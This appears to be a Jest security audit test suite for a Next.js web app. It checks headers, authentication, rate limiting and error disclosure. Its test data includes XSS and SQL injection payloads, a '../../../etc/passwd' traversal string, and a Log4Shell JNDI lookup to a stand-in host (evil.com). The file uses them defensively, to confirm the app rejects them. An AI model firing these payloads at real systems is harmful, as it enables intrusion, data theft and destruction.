/**
 * Security Audit Test Suite
 * 
 * Comprehensive security testing to verify system security measures
 */

import { describe, it, expect } from '@jest/globals';

describe('Security Audit Tests', () => {
  const baseUrl = process.env.NEXTAUTH_URL || 'http://localhost:3000';
  const isProduction = process.env.NODE_ENV === 'production';

  describe('HTTP Security Headers', () => {
    it('should have all required security headers', async () => {
      const response = await fetch(`${baseUrl}/api/health`);
      const headers = response.headers;

      // Content Security Policy
      expect(headers.get('content-security-policy')).toBeDefined();
      
      // XSS Protection
      expect(headers.get('x-xss-protection')).toBe('1; mode=block');
      
      // Content Type Options
      expect(headers.get('x-content-type-options')).toBe('nosniff');
      
      // Frame Options
      expect(headers.get('x-frame-options')).toBe('DENY');
      
      // Referrer Policy
      expect(headers.get('referrer-policy')).toBe('strict-origin-when-cross-origin');
      
      // Permissions Policy
      expect(headers.get('permissions-policy')).toContain('camera=()');
      expect(headers.get('permissions-policy')).toContain('microphone=()');
      expect(headers.get('permissions-policy')).toContain('geolocation=()');
    });

    it('should have HSTS header in production', async () => {
      if (isProduction) {
        const response = await fetch(`${baseUrl}/api/health`);
        const hstsHeader = response.headers.get('strict-transport-security');
        
        expect(hstsHeader).toBeDefined();
        expect(hstsHeader).toContain('max-age=');
        expect(hstsHeader).toContain('includeSubDomains');
      }
    });

    it('should have proper CSP configuration', async () => {
      const response = await fetch(`${baseUrl}/api/health`);
      const csp = response.headers.get('content-security-policy');
      
      expect(csp).toBeDefined();
      expect(csp).toContain("default-src 'self'");
      expect(csp).toContain("object-src 'none'");
      expect(csp).toContain("base-uri 'self'");
      expect(csp).toContain("form-action 'self'");
    });
  });

  describe('Authentication Security', () => {
    it('should protect authenticated routes', async () => {
      const protectedRoutes = [
        '/api/upload',
        '/api/chat',
        '/api/user/profile',
        '/api/storage/google',
        '/api/gdpr/consent',
        '/api/gdpr/data-export',
        '/api/gdpr/data-deletion'
      ];

      for (const route of protectedRoutes) {
        const response = await fetch(`${baseUrl}${route}`, {
          method: 'GET'
        });
        
        expect([401, 403, 405]).toContain(response.status);
      }
    });

    it('should protect admin routes', async () => {
      const adminRoutes = [
        '/api/admin',
        '/api/monitoring/dashboard',
        '/api/feature-flags'
      ];

      for (const route of adminRoutes) {
        const response = await fetch(`${baseUrl}${route}`, {
          method: 'GET'
        });
        
        expect([401, 403, 404]).toContain(response.status);
      }
    });

    it('should validate session tokens properly', async () => {
      const response = await fetch(`${baseUrl}/api/user/profile`, {
        headers: {
          'Authorization': 'Bearer invalid-token'
        }
      });
      
      expect([401, 403]).toContain(response.status);
    });
  });

  describe('Input Validation', () => {
    it('should validate JSON input', async () => {
      const response = await fetch(`${baseUrl}/api/gdpr/consent`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: 'invalid json'
      });

      expect(response.status).toBeGreaterThanOrEqual(400);
    });

    it('should validate required fields', async () => {
      const response = await fetch(`${baseUrl}/api/gdpr/consent`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({})
      });

      expect([400, 401]).toContain(response.status);
    });

    it('should sanitize input data', async () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        '"; DROP TABLE users; --',
        '${jndi:ldap://evil.com/a}',
        '../../../etc/passwd',
        'javascript:alert(1)'
      ];

      for (const input of maliciousInputs) {
        const response = await fetch(`${baseUrl}/api/gdpr/consent`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            consent: {
              essential: true,
              analytics: input, // Malicious input
              marketing: false,
              functional: false
            },
            metadata: {
              version: '1.0'
            }
          })
        });

        // Should either reject the input or sanitize it
        expect([400, 401]).toContain(response.status);
      }
    });
  });

  describe('SQL Injection Protection', () => {
    it('should prevent SQL injection in API endpoints', async () => {
      const sqlInjectionPayloads = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "' UNION SELECT * FROM users --",
        "'; INSERT INTO users VALUES ('hacker', 'password'); --"
      ];

      // Test with endpoints that might be vulnerable
      for (const payload of sqlInjectionPayloads) {
        const response = await fetch(`${baseUrl}/api/health?test=${encodeURIComponent(payload)}`);
        
        // Should not cause server errors or expose data
        expect(response.status).toBeLessThan(500);
        
        const data = await response.json();
        const responseText = JSON.stringify(data);
        
        // Should not contain SQL error messages
        expect(responseText.toLowerCase()).not.toMatch(/sql|database|table|column/);
      }
    });
  });

  describe('XSS Protection', () => {
    it('should prevent reflected XSS', async () => {
      const xssPayloads = [
        '<script>alert("xss")</script>',
        '<img src="x" onerror="alert(1)">',
        'javascript:alert(1)',
        '<svg onload="alert(1)">',
        '"><script>alert(1)</script>'
      ];

      for (const payload of xssPayloads) {
        const response = await fetch(`${baseUrl}/api/health?test=${encodeURIComponent(payload)}`);
        const data = await response.json();
        const responseText = JSON.stringify(data);
        
        // Should not contain unescaped script tags or javascript
        expect(responseText).not.toContain('<script>');
        expect(responseText).not.toContain('javascript:');
        expect(responseText).not.toContain('onerror=');
        expect(responseText).not.toContain('onload=');
      }
    });
  });

  describe('CSRF Protection', () => {
    it('should require proper content type for state-changing operations', async () => {
      const response = await fetch(`${baseUrl}/api/gdpr/consent`, {
        method: 'POST',
        headers: {
          'Content-Type': 'text/plain',
        },
        body: 'malicious data'
      });

      expect([400, 401, 415]).toContain(response.status);
    });

    it('should validate origin headers', async () => {
      const response = await fetch(`${baseUrl}/api/gdpr/consent`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Origin': 'https://evil.com'
        },
        body: JSON.stringify({
          consent: { essential: true, analytics: false, marketing: false, functional: false },
          metadata: { version: '1.0' }
        })
      });

      expect([400, 401, 403]).toContain(response.status);
    });
  });

  describe('Rate Limiting', () => {
    it('should have rate limiting headers', async () => {
      const response = await fetch(`${baseUrl}/api/health`);
      
      expect(response.headers.get('x-ratelimit-limit')).toBeDefined();
      expect(response.headers.get('x-ratelimit-remaining')).toBeDefined();
      expect(response.headers.get('x-ratelimit-reset')).toBeDefined();
    });

    it('should handle rapid requests appropriately', async () => {
      const rapidRequests = 20;
      const promises = Array(rapidRequests).fill(null).map(() =>
        fetch(`${baseUrl}/api/health`)
      );

      const responses = await Promise.all(promises);
      
      // All requests should succeed or be rate limited (not server errors)
      responses.forEach(response => {
        expect([200, 429]).toContain(response.status);
      });
    });
  });

  describe('Information Disclosure', () => {
    it('should not expose sensitive information in error messages', async () => {
      const response = await fetch(`${baseUrl}/api/nonexistent`);
      const data = await response.json();
      const responseText = JSON.stringify(data);

      // Should not expose internal paths, stack traces, or sensitive data
      expect(responseText.toLowerCase()).not.toMatch(/password|secret|key|token|api_key/);
      expect(responseText).not.toMatch(/\/[a-z]+\/[a-z]+\/[a-z]+/); // File paths
      expect(responseText).not.toContain('Error:');
      expect(responseText).not.toContain('at ');
    });

    it('should not expose server information', async () => {
      const response = await fetch(`${baseUrl}/api/health`);
      
      // Should not expose server software versions
      expect(response.headers.get('server')).toBeNull();
      expect(response.headers.get('x-powered-by')).toBeNull();
    });

    it('should not expose environment variables', async () => {
      const response = await fetch(`${baseUrl}/api/health`);
      const data = await response.json();
      const responseText = JSON.stringify(data);

      // Should not contain environment variable patterns
      expect(responseText).not.toMatch(/[A-Z_]+_KEY/);
      expect(responseText).not.toMatch(/[A-Z_]+_SECRET/);
      expect(responseText).not.toMatch(/[A-Z_]+_TOKEN/);
    });
  });

  describe('File Upload Security', () => {
    it('should validate file types', async () => {
      // This would require actual file upload testing
      // For now, we verify the endpoint exists and requires auth
      const response = await fetch(`${baseUrl}/api/upload`, {
        method: 'POST'
      });

      expect([401, 403, 400]).toContain(response.status);
    });
  });

  describe('Session Security', () => {
    it('should have secure session configuration', async () => {
      // Verify NextAuth configuration
      expect(process.env.NEXTAUTH_SECRET).toBeDefined();
      expect(process.env.NEXTAUTH_SECRET!.length).toBeGreaterThan(32);
      
      if (isProduction) {
        expect(process.env.NEXTAUTH_URL).toMatch(/^https:/);
      }
    });
  });

  describe('API Security', () => {
    it('should not expose internal API structure', async () => {
      const response = await fetch(`${baseUrl}/api`);
      
      // Should not return directory listing or API documentation
      expect([404, 405]).toContain(response.status);
    });

    it('should handle malformed requests gracefully', async () => {
      const malformedRequests = [
        { method: 'GET', headers: { 'Content-Length': '-1' } },
        { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: 'a'.repeat(10000) },
        { method: 'PUT', headers: { 'Transfer-Encoding': 'chunked' } }
      ];

      for (const request of malformedRequests) {
        try {
          const response = await fetch(`${baseUrl}/api/health`, request);
          expect(response.status).toBeLessThan(500);
        } catch (error) {
          // Network errors are acceptable for malformed requests
          expect(error).toBeDefined();
        }
      }
    });
  });

  describe('Dependency Security', () => {
    it('should not have known vulnerable dependencies', async () => {
      // This would typically be checked by npm audit or similar tools
      // For now, we verify the system is running
      const response = await fetch(`${baseUrl}/api/health`);
      expect(response.status).toBe(200);
    });
  });

  describe('Environment Security', () => {
    it('should have secure environment configuration', async () => {
      // Verify critical environment variables are set
      const requiredSecureEnvVars = [
        'NEXTAUTH_SECRET',
        'SUPABASE_SERVICE_ROLE_KEY',
        'OPENAI_API_KEY'
      ];

      requiredSecureEnvVars.forEach(envVar => {
        expect(process.env[envVar]).toBeDefined();
        expect(process.env[envVar]!.length).toBeGreaterThan(10);
      });
    });

    it('should use HTTPS in production', async () => {
      if (isProduction) {
        expect(baseUrl).toMatch(/^https:/);
      }
    });
  });
});